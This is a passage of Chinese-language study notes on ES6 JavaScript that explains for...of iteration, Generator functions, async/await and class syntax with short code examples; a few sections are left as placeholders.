&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>对于普通的对象，<code>for...of</code>结构不能直接使用，会报错，必须部署了 Iterator 接口后才能使用。</p><p>一种解决方法是，使用<code>Object.keys</code>方法将对象的键名生成一个数组，然后遍历这个数组。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(someObject)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key + <span class="string">&#x27;: &#x27;</span> + someObject[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个方法是使用 Generator 函数将对象重新包装一下。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">entries</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj)) &#123;</span><br><span class="line">    <span class="keyword">yield</span> [key, obj[key]];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> entries(obj)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, <span class="string">&#x27;-&gt;&#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a -&gt; 1</span></span><br><span class="line"><span class="comment">// b -&gt; 2</span></span><br><span class="line"><span class="comment">// c -&gt; 3</span></span><br></pre></td></tr></table></figure><h3 id="与其他遍历语法的比较"><a href="#与其他遍历语法的比较" class="headerlink" title="与其他遍历语法的比较"></a>与其他遍历语法的比较</h3><ul><li><code>forEach</code>方法问题在于，无法中途跳出循环，<code>break</code>命令或<code>return</code>命令都不能奏效。</li><li><code>for...in</code>循环有几个缺点：<ul><li>数组的键名是数字，但是<code>for...in</code>循环是以字符串作为键名“0”、“1”、“2”等等。</li><li><code>for...in</code>循环不仅遍历数字键名，还会遍历手动添加的其他键，甚至包括原型链上的键。</li><li>某些情况下，<code>for...in</code>循环会以任意顺序遍历键名。</li></ul></li><li><code>for...of</code>循环相比上面几种做法，有一些显著的优点：<ul><li>有着同<code>for...in</code>一样的简洁语法，但是没有<code>for...in</code>那些缺点。</li><li>不同于<code>forEach</code>方法，它可以与<code>break</code>、<code>continue</code>和<code>return</code>配合使用。</li><li>提供了遍历所有数据结构的统一操作接口。</li></ul></li></ul><h1 id="Generator-函数的语法"><a href="#Generator-函数的语法" class="headerlink" title="Generator 函数的语法"></a>Generator 函数的语法</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>Generator 函数是 ES6 提供的一种异步编程解决方案，Generator 函数有多种理解角度：</p><ul><li>语法上，首先可以把它理解成，Generator 函数是一个状态机，封装了多个内部状态。执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。</li><li>形式上，Generator 函数是一个普通函数，但是有两个特征。一是，<code>function</code>关键字与函数名之间有一个星号；二是，函数体内部使用<code>yield</code>表达式，定义不同的内部状态（<code>yield</code>在英语里的意思就是“产出”）。</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">helloWorldGenerator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;ending&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hw = helloWorldGenerator();</span><br></pre></td></tr></table></figure><p>上面代码定义了一个 Generator 函数<code>helloWorldGenerator</code>，它内部有两个<code>yield</code>表达式（<code>hello</code>和<code>world</code>），即该函数有三个状态：hello，world 和 return 语句（结束执行）。</p><p>然后，Generator 函数的调用方法与普通函数一样，也是在函数名后面加上一对圆括号。不同的是，调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象（遍历器对象）。</p><p>下一步，必须调用遍历器对象的<code>next</code>方法，使得指针移向下一个状态。也就是说，每次调用<code>next</code>方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个<code>yield</code>表达式（或<code>return</code>语句）为止。换言之，Generator 函数是分段执行的，<code>yield</code>表达式是暂停执行的标记，而<code>next</code>方法可以恢复执行。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: &#x27;hello&#x27;, done: false &#125;</span></span><br><span class="line"></span><br><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: &#x27;world&#x27;, done: false &#125;</span></span><br><span class="line"></span><br><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: &#x27;ending&#x27;, done: true &#125;</span></span><br><span class="line"></span><br><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><p>总结一下，调用 Generator 函数，返回一个遍历器对象，代表 Generator 函数的内部指针。以后，每次调用遍历器对象的<code>next</code>方法，就会返回一个有着<code>value</code>和<code>done</code>两个属性的对象。<code>value</code>属性表示当前的内部状态的值，是<code>yield</code>表达式后面那个表达式的值；<code>done</code>属性是一个布尔值，表示是否遍历结束。</p><p>…（todo）</p><h1 id="Generator-函数的异步应用"><a href="#Generator-函数的异步应用" class="headerlink" title="Generator 函数的异步应用"></a>Generator 函数的异步应用</h1><p>…（todo）</p><h1 id="async-函数"><a href="#async-函数" class="headerlink" title="async 函数"></a>async 函数</h1><h2 id="1、含义"><a href="#1、含义" class="headerlink" title="1、含义"></a>1、含义</h2><p>async 函数是 Generator 函数的语法糖。async<code>函数就是将 Generator 函数的星号（</code>*<code>）替换成</code>async<code>，将</code>yield<code>替换成</code>await。</p><p><code>async</code>函数对 Generator 函数的改进，体现在以下四点。</p><p>（1）内置执行器。</p><p>Generator 函数的执行必须靠执行器，所以才有了<code>co</code>模块，而<code>async</code>函数自带执行器。</p><p>（2）更好的语义。</p><p><code>async</code>和<code>await</code>，比起星号和<code>yield</code>，语义更清楚了。<code>async</code>表示函数里有异步操作，<code>await</code>表示紧跟在后面的表达式需要等待结果。</p><p>（3）更广的适用性。</p><p><code>co</code>模块约定，<code>yield</code>命令后面只能是 Thunk 函数或 Promise 对象，而<code>async</code>函数的<code>await</code>命令后面，可以是 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时会自动转成立即 resolved 的 Promise 对象）。</p><p>（4）返回值是 Promise。</p><p><code>async</code>函数的返回值是 Promise 对象，这比 Generator 函数的返回值是 Iterator 对象方便多了，可以用<code>then</code>方法指定下一步的操作。进一步说，<code>async</code>函数完全可以看作多个异步操作，包装成的一个 Promise 对象，而<code>await</code>命令就是内部<code>then</code>命令的语法糖。</p><h2 id="2、基本用法-1"><a href="#2、基本用法-1" class="headerlink" title="2、基本用法"></a>2、基本用法</h2><p><code>async</code>函数返回一个 Promise 对象，可以使用<code>then</code>方法添加回调函数。当函数执行的时候，一旦遇到<code>await</code>就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。</p><p>async 函数有多种使用形式。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象的方法</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="keyword">async</span> <span class="function"><span class="title">foo</span>(<span class="params"></span>)</span> &#123;&#125; &#125;;</span><br><span class="line">obj.foo().then(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class 的方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Storage</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.cachePromise = caches.open(<span class="string">&#x27;avatars&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="title">getAvatar</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> cache = <span class="keyword">await</span> <span class="built_in">this</span>.cachePromise;</span><br><span class="line">    <span class="keyword">return</span> cache.match(<span class="string">`/avatars/<span class="subst">$&#123;name&#125;</span>.jpg`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = <span class="keyword">new</span> Storage();</span><br><span class="line">storage.getAvatar(<span class="string">&#x27;jake&#x27;</span>).then(…);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">async</span> () =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure><h2 id="3、语法"><a href="#3、语法" class="headerlink" title="3、语法"></a>3、语法</h2><h3 id="返回-Promise-对象"><a href="#返回-Promise-对象" class="headerlink" title="返回 Promise 对象"></a>返回 Promise 对象</h3><p><code>async</code>函数返回一个 Promise 对象。<code>async</code>函数内部<code>return</code>语句返回的值，会成为<code>then</code>方法回调函数的参数。</p><p><code>async</code>函数内部抛出错误，会导致返回的 Promise 对象变为<code>reject</code>状态。抛出的错误对象会被<code>catch</code>方法回调函数接收到。</p><h3 id="Promise-对象的状态变化"><a href="#Promise-对象的状态变化" class="headerlink" title="Promise 对象的状态变化"></a>Promise 对象的状态变化</h3><p><code>async</code>函数返回的 Promise 对象，必须等到内部所有<code>await</code>命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到<code>return</code>语句或者抛出错误。也就是说，只有<code>async</code>函数内部的异步操作执行完，才会执行<code>then</code>方法指定的回调函数。</p><h3 id="await-命令"><a href="#await-命令" class="headerlink" title="await 命令"></a>await 命令</h3><p>正常情况下，<code>await</code>命令后面是一个 Promise 对象，返回该对象的结果。如果不是 Promise 对象，就直接返回对应的值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 等同于 return 123;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f().then(<span class="function"><span class="params">v</span> =&gt;</span> <span class="built_in">console</span>.log(v))</span><br><span class="line"><span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p>另一种情况是，<code>await</code>命令后面是一个<code>thenable</code>对象（即定义了<code>then</code>方法的对象），那么<code>await</code>会将其等同于 Promise 对象。</p><p>任何一个<code>await</code>语句后面的 Promise 对象变为<code>reject</code>状态，那么整个<code>async</code>函数都会中断执行。有时，我们希望即使前一个异步操作失败，也不要中断后面的异步操作。这时可以将第一个<code>await</code>放在<code>try...catch</code>结构里面，这样不管这个异步操作是否成功，第二个<code>await</code>都会执行。</p><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>如果<code>await</code>后面的异步操作出错，那么等同于<code>async</code>函数返回的 Promise 对象被<code>reject</code>。防止出错的方法，也是将其放在<code>try...catch</code>代码块之中。</p><h3 id="使用注意点-1"><a href="#使用注意点-1" class="headerlink" title="使用注意点"></a>使用注意点</h3><ul><li><p>第一点，前面已经说过，<code>await</code>命令后面的<code>Promise</code>对象，运行结果可能是<code>rejected</code>，所以最好把<code>await</code>命令放在<code>try...catch</code>代码块中。</p></li><li><p>第二点，多个<code>await</code>命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = <span class="keyword">await</span> getFoo();</span><br><span class="line"><span class="keyword">let</span> bar = <span class="keyword">await</span> getBar();</span><br></pre></td></tr></table></figure><p>上面代码中，<code>getFoo</code>和<code>getBar</code>是两个独立的异步操作（即互不依赖），被写成继发关系。这样比较耗时，因为只有<code>getFoo</code>完成以后，才会执行<code>getBar</code>，完全可以让它们同时触发。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">let</span> [foo, bar] = <span class="keyword">await</span> <span class="built_in">Promise</span>.all([getFoo(), getBar()]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">let</span> fooPromise = getFoo();</span><br><span class="line"><span class="keyword">let</span> barPromise = getBar();</span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">await</span> fooPromise;</span><br><span class="line"><span class="keyword">let</span> bar = <span class="keyword">await</span> barPromise;</span><br></pre></td></tr></table></figure><p>上面两种写法，<code>getFoo</code>和<code>getBar</code>都是同时触发，这样就会缩短程序的执行时间。</p></li><li><p>第三点，<code>await</code>命令只能用在<code>async</code>函数之中，如果用在普通函数，就会报错。</p></li><li><p>第四点，async 函数可以保留运行堆栈。</p></li></ul><h2 id="4、async-函数的实现原理"><a href="#4、async-函数的实现原理" class="headerlink" title="4、async 函数的实现原理"></a>4、async 函数的实现原理</h2><p>async 函数的实现原理，就是将 Generator 函数和自动执行器，包装在一个函数里。</p><h2 id="5、与其他异步处理方法的比较"><a href="#5、与其他异步处理方法的比较" class="headerlink" title="5、与其他异步处理方法的比较"></a>5、与其他异步处理方法的比较</h2><p>假定某个 DOM 元素上面，部署了一系列的动画，前一个动画结束，才能开始后一个。如果当中有一个动画出错，就不再往下执行，返回上一个成功执行的动画的返回值。</p><p>async 函数的写法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">chainAnimationsAsync</span>(<span class="params">elem, animations</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ret = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> anim <span class="keyword">of</span> animations) &#123;</span><br><span class="line">      ret = <span class="keyword">await</span> anim(elem);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="comment">/* 忽略错误，继续执行 */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6、实例：按顺序完成异步操作"><a href="#6、实例：按顺序完成异步操作" class="headerlink" title="6、实例：按顺序完成异步操作"></a>6、实例：按顺序完成异步操作</h2><p>依次远程读取一组 URL，然后按照读取的顺序输出结果。</p><p>sync 函数实现。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logInOrder</span>(<span class="params">urls</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> url <span class="keyword">of</span> urls) &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(url);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">await</span> response.text());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码确实大大简化，问题是所有远程操作都是继发。只有前一个 URL 返回结果，才会去读取下一个 URL，这样做效率很差，非常浪费时间。我们需要的是并发发出远程请求。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logInOrder</span>(<span class="params">urls</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 并发读取远程URL</span></span><br><span class="line">  <span class="keyword">const</span> textPromises = urls.map(<span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(url);</span><br><span class="line">    <span class="keyword">return</span> response.text();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 按次序输出</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> textPromise <span class="keyword">of</span> textPromises) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">await</span> textPromise);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，虽然<code>map</code>方法的参数是<code>async</code>函数，但它是并发执行的，因为只有<code>async</code>函数内部是继发执行，外部不受影响。后面的<code>for..of</code>循环内部使用了<code>await</code>，因此实现了按顺序输出。</p><h1 id="Class-的基本语法"><a href="#Class-的基本语法" class="headerlink" title="Class 的基本语法"></a>Class 的基本语法</h1><h2 id="1、简介-1"><a href="#1、简介-1" class="headerlink" title="1、简介"></a>1、简介</h2><h3 id="类的由来"><a href="#类的由来" class="headerlink" title="类的由来"></a>类的由来</h3><p>JavaScript 语言中，生成实例对象的传统方法是通过构造函数。ES6 的<code>class</code>可以看作只是一个语法糖。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x;</span><br><span class="line">    <span class="built_in">this</span>.y = y;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;(&#x27;</span> + <span class="built_in">this</span>.x + <span class="string">&#x27;, &#x27;</span> + <span class="built_in">this</span>.y + <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码定义了一个“类”，可以看到里面有一个<code>constructor()</code>方法，这就是构造方法，而<code>this</code>关键字则代表实例对象。<code>Point</code>类除了构造方法，还定义了一个<code>toString()</code>方法。注意，定义<code>toString()</code>方法的时候，前面不需要加上<code>function</code>这个关键字，直接把函数定义放进去了就可以了。</p><p>ES6 的类，完全可以看作构造函数的另一种写法。类的数据类型就是函数，类本身就指向构造函数。使用的时候，也是直接对类使用<code>new</code>命令，跟构造函数的用法完全一致。</p><p>构造函数的<code>prototype</code>属性，在 ES6 的“类”上面继续存在。事实上，类的所有方法都定义在类的<code>prototype</code>属性上面。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toValue</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"></span><br><span class="line">Point.prototype = &#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;&#125;,</span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;&#125;,</span><br><span class="line">  <span class="function"><span class="title">toValue</span>(<span class="params"></span>)</span> &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因此，在类的实例上面调用方法，其实就是调用原型上的方法。</p><p>由于类的方法都定义在<code>prototype</code>对象上面，所以类的新方法可以添加在<code>prototype</code>对象上面。<code>Object.assign()</code>方法可以很方便地一次向类添加多个方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(Point.prototype, &#123;</span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">  <span class="function"><span class="title">toValue</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>另外，类的内部所有定义的方法，都是不可枚举的（non-enumerable）。</p><h3 id="constructor-方法"><a href="#constructor-方法" class="headerlink" title="constructor 方法"></a>constructor 方法</h3><p><code>constructor()</code>方法是类的默认方法，通过<code>new</code>命令生成对象实例时，自动调用该方法，默认返回实例对象（即<code>this</code>）。一个类必须有<code>constructor()</code>方法，如果没有显式定义，一个空的<code>constructor()</code>方法会被默认添加。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类必须使用<code>new</code>调用，否则会报错。这是它跟普通构造函数的一个主要区别，后者不用<code>new</code>也可以执行。</p><h3 id="类的实例"><a href="#类的实例" class="headerlink" title="类的实例"></a>类的实例</h3><p>实例的属性除非显式定义在其本身（即定义在<code>this</code>对象上），否则都是定义在原型上（即定义在<code>class</code>上）。</p><p>类的所有实例共享一个原型对象。这也意味着，可以通过实例的<code>__proto__</code>属性为“类”添加方法。</p><h3 id="取值函数（getter）和存值函数（setter）"><a href="#取值函数（getter）和存值函数（setter）" class="headerlink" title="取值函数（getter）和存值函数（setter）"></a>取值函数（getter）和存值函数（setter）</h3><h3 id="属性表达式"><a href="#属性表达式" class="headerlink" title="属性表达式"></a>属性表达式</h3><p>类的属性名，可以采用表达式。</p><h3 id="注意点-2"><a href="#注意点-2" class="headerlink" title="注意点"></a>注意点</h3><p><strong>（1）严格模式</strong></p><p>类和模块的内部，默认就是严格模式，所以不需要使用<code>use strict</code>指定运行模式。</p><p><strong>（2）不存在提升</strong></p><p>类不存在变量提升（hoist）</p><p><strong>（3）name 属性</strong></p><p>由于本质上，ES6 的类只是 ES5 的构造函数的一层包装，所以函数的许多特性都被<code>Class</code>继承，包括<code>name</code>属性。<code>name</code>属性总是返回紧跟在<code>class</code>关键字后面的类名。</p><p><strong>（4）Generator 方法</strong></p><p>如果某个方法之前加上星号（<code>*</code>），就表示该方法是一个 Generator 函数。</p><p><strong>（5）this 的指向</strong></p><p>类的方法内部如果含有<code>this</code>，它默认指向类的实例。但是，必须非常小心，一旦单独使用该方法，很可能报错。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">printName</span>(<span class="params">name = <span class="string">&#x27;there&#x27;</span></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.print(<span class="string">`Hello <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">print</span>(<span class="params">text</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="keyword">const</span> &#123; printName &#125; = logger;</span><br><span class="line">printName(); <span class="comment">// TypeError: Cannot read property &#x27;print&#x27; of undefined</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>printName</code>方法中的<code>this</code>，默认指向<code>Logger</code>类的实例。但是，如果将这个方法提取出来单独使用，<code>this</code>会指向该方法运行时所在的环境（由于 class 内部是严格模式，所以 this 实际指向的是<code>undefined</code>），从而导致找不到<code>print</code>方法而报错。</p><p>一个比较简单的解决方法是，在构造方法中绑定<code>this</code>，这样就不会找不到<code>print</code>方法了。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.printName = <span class="built_in">this</span>.printName.bind(<span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一种解决方法是使用箭头函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Obj</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.getThis = <span class="function">() =&gt;</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、静态方法"><a href="#2、静态方法" class="headerlink" title="2、静态方法"></a>2、静态方法</h2><p>类相当于实例的原型，所有在类中定义的方法，都会被实例继承。如果在一个方法前，加上<code>static</code>关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。</p><p>注意，如果静态方法包含<code>this</code>关键字，这个<code>this</code>指的是类，而不是实例。</p><p>父类的静态方法，可以被子类继承。静态方法也是可以从<code>super</code>对象上调用的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="title">classMethod</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> <span class="keyword">extends</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="title">classMethod</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.classMethod() + <span class="string">&#x27;, too&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Bar.classMethod() <span class="comment">// &quot;hello, too&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3、实例属性的新写法"><a href="#3、实例属性的新写法" class="headerlink" title="3、实例属性的新写法"></a>3、实例属性的新写法</h2><p>实例属性除了定义在<code>constructor()</code>方法里面的<code>this</code>上面，也可以定义在类的最顶层，这时，不需要在实例属性前面加上<code>this</code>。</p><p>这种新写法的好处是，所有实例对象自身的属性都定义在类的头部，看上去比较整齐，一眼就能看出这个类有哪些实例属性。</p><h2 id="4、静态属性"><a href="#4、静态属性" class="headerlink" title="4、静态属性"></a>4、静态属性</h2><p>静态属性指的是 Class 本身的属性，即<code>Class.propName</code>，而不是定义在实例对象（<code>this</code>）上的属性。</p><p>ES6 明确规定，Class 内部只有静态方法，没有静态属性。现在有一个<a href="https://github.com/tc39/proposal-class-fields">提案</a>提供了类的静态属性，写法是在实例属性的前面，加上<code>static</code>关键字。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 老写法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">Foo.prop = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新写法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> prop = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、new-target-属性"><a href="#5、new-target-属性" class="headerlink" title="5、new.target 属性"></a>5、new.target 属性</h2><p><code>new</code>是从构造函数生成实例对象的命令。ES6 为<code>new</code>命令引入了一个<code>new.target</code>属性，该属性一般用在构造函数之中，返回<code>new</code>命令作用于的那个构造函数。如果构造函数不是通过<code>new</code>命令或<code>Reflect.construct()</code>调用的，<code>new.target</code>会返回<code>undefined</code>，因此这个属性可以用来确定构造函数是怎么调用的。</p><figure class="highlight javascript"><table><tr><td 